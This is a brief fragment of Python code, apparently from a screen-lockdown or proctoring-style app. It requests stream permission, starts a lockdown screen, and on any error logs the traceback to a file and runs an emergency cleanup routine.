        ask_stream_permission_initially()
        
        init_lockdown_screen()
    except Exception as e:
        import traceback
        try:
            with open("crash_error.log", "w") as f:
                traceback.print_exc(file=f)
        except Exception:
            pass
        emergency_system_cleanup()
